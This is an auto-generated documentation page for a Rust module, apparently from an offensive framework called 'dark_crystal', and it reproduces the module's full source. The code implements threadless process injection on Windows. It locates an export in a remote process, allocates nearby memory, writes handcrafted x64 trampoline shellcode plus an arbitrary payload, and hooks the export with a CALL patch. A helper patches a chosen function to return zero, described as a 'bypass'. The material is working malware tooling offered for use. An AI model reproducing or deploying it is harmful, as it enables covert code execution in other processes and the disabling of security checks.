# threadless

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/injection/threadless.rs` |
| **Lines** | 328 |
| **Cards** | T007-process-injection |
| **Role** | Threadless injection |
| **Unsafe blocks** | 5 |

## Constants

- `TH32CS_SNAPMODULE`: `u32` = `0x0000_0008`
- `TH32CS_SNAPMODULE32`: `u32` = `0x0000_0010`
- `CLEAN_STUB`: `[u8; 3]` = `[0x31, 0xC0, 0xC3]` — xor eax,eax; ret

## Types

### struct `ModuleEntry32W` (line 52)

## Public API

### `try_threadless_inject` `unsafe` (line 139)
```rust
pub unsafe fn try_threadless_inject(
```

### `install_clean_stub` `unsafe` (line 325)
```rust
pub unsafe fn install_clean_stub(h_process: HANDLE, target_dll: &str, target_export: &str) -> bool
```

## Internal Functions

- `utf16z_to_string` (line 69)
- `remote_module_base` (unsafe) (line 74)
- `find_memory_hole` (line 256)
- `install_trampoline` (line 279)

## Key Dependencies

- `use windows::core::PCSTR;`
- `use windows::Win32::Foundation::{HANDLE, HMODULE, INVALID_HANDLE_VALUE};`
- `use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId};`
- `use windows::Win32::System::{`
- `use windows_sys::core::BOOL;`

## Full Source

```rust
use std::ffi::{c_void, CString};
use std::mem::size_of;
use std::path::Path;
use windows::core::PCSTR;
use windows::Win32::Foundation::{HANDLE, HMODULE, INVALID_HANDLE_VALUE};
use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId};
use windows::Win32::System::{
    Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
    LibraryLoader::{GetProcAddress, LoadLibraryA},
    Memory::{
        VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    },
};
use windows_sys::core::BOOL;

// Expanded PATCH_SHELLCODE with XMM preservation (~121 bytes)
// Opcodes manually crafted to include XMM0-XMM5 preservation
pub static mut PATCH_SHELLCODE: [u8; 121] = [
    0x58, // POP RAX
    0x48, 0x83, 0xE8, 0x05, // SUB RAX, 5
    0x50, // PUSH RAX
    0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, // PUSH RCX,RDX,R8,R9,R10,R11
    0x48, 0xB9, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
    0xBB, // MOV RCX, [original bytes] (offset 18)
    0x48, 0x89, 0x08, // MOV [RAX], RCX
    0x48, 0x81, 0xEC, 0xA8, 0x00, 0x00,
    0x00, // SUB RSP, 0xA8 to restore 16-byte alignment before MOVAPS
    0x0F, 0x29, 0x44, 0x24, 0x40, // MOVAPS [RSP+0x40], XMM0
    0x0F, 0x29, 0x4C, 0x24, 0x50, // MOVAPS [RSP+0x50], XMM1
    0x0F, 0x29, 0x54, 0x24, 0x60, // MOVAPS [RSP+0x60], XMM2
    0x0F, 0x29, 0x5C, 0x24, 0x70, // MOVAPS [RSP+0x70], XMM3
    0x0F, 0x29, 0x64, 0x24, 0x80, // MOVAPS [RSP+0x80], XMM4
    0x0F, 0x29, 0x6C, 0x24, 0x90, // MOVAPS [RSP+0x90], XMM5
    0xE8, 0x11, 0x00, 0x00, 0x00, // CALL +0x11 (Shellcode follows)
    0x0F, 0x28, 0x6C, 0x24, 0x90, // MOVAPS XMM5, [RSP+0x90]
    0x0F, 0x28, 0x64, 0x24, 0x80, // MOVAPS XMM4, [RSP+0x80]
    0x0F, 0x28, 0x5C, 0x24, 0x70, // MOVAPS XMM3, [RSP+0x70]
    0x0F, 0x28, 0x54, 0x24, 0x60, // MOVAPS XMM2, [RSP+0x60]
    0x0F, 0x28, 0x4C, 0x24, 0x50, // MOVAPS XMM1, [RSP+0x50]
    0x0F, 0x28, 0x44, 0x24, 0x40, // MOVAPS XMM0, [RSP+0x40]
    0x48, 0x81, 0xC4, 0xA8, 0x00, 0x00, 0x00, // ADD RSP, 0xA8
    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59,
    0x58, // POP R11,R10,R9,R8,RDX,RCX,RAX
    0xFF, 0xE0, // JMP RAX
];

const TH32CS_SNAPMODULE: u32 = 0x0000_0008;
const TH32CS_SNAPMODULE32: u32 = 0x0000_0010;

#[repr(C)]
struct ModuleEntry32W {
    dw_size: u32,
    th32_module_id: u32,
    th32_process_id: u32,
    glblcnt_usage: u32,
    proccnt_usage: u32,
    mod_base_addr: *mut u8,
    mod_base_size: u32,
    h_module: HMODULE,
    sz_module: [u16; 256],
    sz_exe_path: [u16; 260],
}

type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> HANDLE;
type Module32FirstWFn = unsafe extern "system" fn(HANDLE, *mut ModuleEntry32W) -> BOOL;
type Module32NextWFn = unsafe extern "system" fn(HANDLE, *mut ModuleEntry32W) -> BOOL;

fn utf16z_to_string(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

unsafe fn remote_module_base(h_process: HANDLE, target_dll: &str) -> Option<*mut c_void> {
    let kernel32 = LoadLibraryA(PCSTR(c"kernel32.dll".as_ptr() as *const u8)).ok()?;
    let create_snapshot = GetProcAddress(
        kernel32,
        PCSTR(c"CreateToolhelp32Snapshot".as_ptr() as *const u8),
    )
    .map(|proc| std::mem::transmute::<_, CreateToolhelp32SnapshotFn>(proc))?;
    let module32_first = GetProcAddress(kernel32, PCSTR(c"Module32FirstW".as_ptr() as *const u8))
        .map(|proc| std::mem::transmute::<_, Module32FirstWFn>(proc))?;
    let module32_next = GetProcAddress(kernel32, PCSTR(c"Module32NextW".as_ptr() as *const u8))
        .map(|proc| std::mem::transmute::<_, Module32NextWFn>(proc))?;

    let pid = GetProcessId(h_process);
    if pid == 0 {
        return None;
    }

    let snapshot = create_snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if snapshot == INVALID_HANDLE_VALUE {
        return None;
    }

    let target_name = Path::new(target_dll)
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())?;
    let mut entry = ModuleEntry32W {
        dw_size: size_of::<ModuleEntry32W>() as u32,
        th32_module_id: 0,
        th32_process_id: 0,
        glblcnt_usage: 0,
        proccnt_usage: 0,
        mod_base_addr: std::ptr::null_mut(),
        mod_base_size: 0,
        h_module: HMODULE(std::ptr::null_mut()),
        sz_module: [0; 256],
        sz_exe_path: [0; 260],
    };

    let mut module_base = None;
    if module32_first(snapshot, &mut entry) != 0 {
        loop {
            let module_name = utf16z_to_string(&entry.sz_module).to_ascii_lowercase();
            let module_path = utf16z_to_string(&entry.sz_exe_path).to_ascii_lowercase();

            if module_name == target_name
                || Path::new(&module_path)
                    .file_name()
                    .map(|name| name.to_string_lossy().to_ascii_lowercase() == target_name)
                    .unwrap_or(false)
            {
                module_base = Some(entry.mod_base_addr as *mut c_void);
                break;
            }

            entry.dw_size = size_of::<ModuleEntry32W>() as u32;
            if module32_next(snapshot, &mut entry) == 0 {
                break;
            }
        }
    }

    let _ = windows::Win32::Foundation::CloseHandle(snapshot);
    module_base
}

pub unsafe fn try_threadless_inject(
    h_process: HANDLE,
    target_dll: &str,
    target_export: &str,
    shellcode: &[u8],
) -> bool {
    let h_module = LoadLibraryA(PCSTR(
        CString::new(target_dll).unwrap().as_ptr() as *const u8
    ));
    if h_module.is_err() {
        return false;
    }
    let h_module = h_module.unwrap();

    let address = GetProcAddress(
        h_module,
        PCSTR(CString::new(target_export).unwrap().as_ptr() as *const u8),
    );
    if address.is_none() {
        return false;
    }
    let func_rva = address.unwrap() as usize - h_module.0 as usize;
    let func_address = if h_process == GetCurrentProcess() {
        (h_module.0 as usize + func_rva) as *mut c_void
    } else {
        let remote_base = remote_module_base(h_process, target_dll);
        if remote_base.is_none() {
            return false;
        }
        ((remote_base.unwrap() as usize) + func_rva) as *mut c_void
    };

    let mut original_bytes = [0u8; 8];
    let mut bytes_read = 0;

    // Leer bytes originales del proceso destino (si es remoto) o localmente si es el mismo.
    let current = GetCurrentProcess();
    if h_process != current {
        let _ = ReadProcessMemory(
            h_process,
            func_address,
            original_bytes.as_mut_ptr() as *mut c_void,
            original_bytes.len(),
            Some(&mut bytes_read),
        );
        if bytes_read != original_bytes.len() {
            return false;
        }
    } else {
        std::ptr::copy_nonoverlapping(
            func_address as *const u8,
            original_bytes.as_mut_ptr(),
            original_bytes.len(),
        );
    }

    let mut patch = PATCH_SHELLCODE;
    patch[18..26].copy_from_slice(&original_bytes);

    let hole = find_memory_hole(
        h_process,
        func_address as usize,
        shellcode.len() + patch.len(),
    );
    if hole.is_none() {
        return false;
    }
    let hole = hole.unwrap();

    let mut written = 0;
    if WriteProcessMemory(
        h_process,
        hole,
        patch.as_ptr() as *const c_void,
        patch.len(),
        Some(&mut written),
    )
    .is_err()
    {
        let _ = VirtualFreeEx(h_process, hole, 0, MEM_RELEASE);
        return false;
    }
    if WriteProcessMemory(
        h_process,
        (hole as *mut u8).add(patch.len()) as *mut c_void,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        Some(&mut written),
    )
    .is_err()
    {
        let _ = VirtualFreeEx(h_process, hole, 0, MEM_RELEASE);
        return false;
    }

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    if VirtualProtectEx(
        h_process,
        hole,
        patch.len() + shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect,
    )
    .is_err()
    {
        let _ = VirtualFreeEx(h_process, hole, 0, MEM_RELEASE);
        return false;
    }

    if install_trampoline(h_process, hole, func_address) {
        true
    } else {
        let _ = VirtualFreeEx(h_process, hole, 0, MEM_RELEASE);
        false
    }
}

fn find_memory_hole(h_process: HANDLE, func_address: usize, size: usize) -> Option<*mut c_void> {
    let mut address = (func_address & 0xFFFFFFFFFFF70000).wrapping_sub(0x70000000);
    while address < func_address + 0x70000000 {
        let tmp_address = unsafe {
            VirtualAllocEx(
                h_process,
                Some(address as *mut c_void),
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };

        if !tmp_address.is_null() {
            return Some(tmp_address);
        }

        address = address.wrapping_add(0x10000);
    }

    None
}

fn install_trampoline(h_process: HANDLE, hole: *mut c_void, function_address: *mut c_void) -> bool {
    unsafe {
        let mut trampoline = [0xE8, 0x00, 0x00, 0x00, 0x00];
        let rva = (hole as isize).wrapping_sub(function_address as isize + 5);

        // Check if RVA fits in 32 bits
        if rva < i32::MIN as isize || rva > i32::MAX as isize {
            return false;
        }

        let rva_bytes = (rva as i32).to_ne_bytes();
        trampoline[1..5].copy_from_slice(&rva_bytes);

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        let mut written = 0;

        if VirtualProtectEx(
            h_process,
            function_address,
            5,
            PAGE_READWRITE,
            &mut old_protect,
        )
        .is_ok()
        {
            WriteProcessMemory(
                h_process,
                function_address,
                trampoline.as_ptr() as *const c_void,
                5,
                Some(&mut written),
            );
            VirtualProtectEx(
                h_process,
                function_address,
                5,
                old_protect,
                &mut old_protect,
            );
            return true;
        }
        false
    }
}

// Hook ligero para bypass (xor eax, eax; ret) usando el mecanismo threadless.
pub unsafe fn install_clean_stub(h_process: HANDLE, target_dll: &str, target_export: &str) -> bool {
    const CLEAN_STUB: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax,eax; ret
    try_threadless_inject(h_process, target_dll, target_export, &CLEAN_STUB)
}

```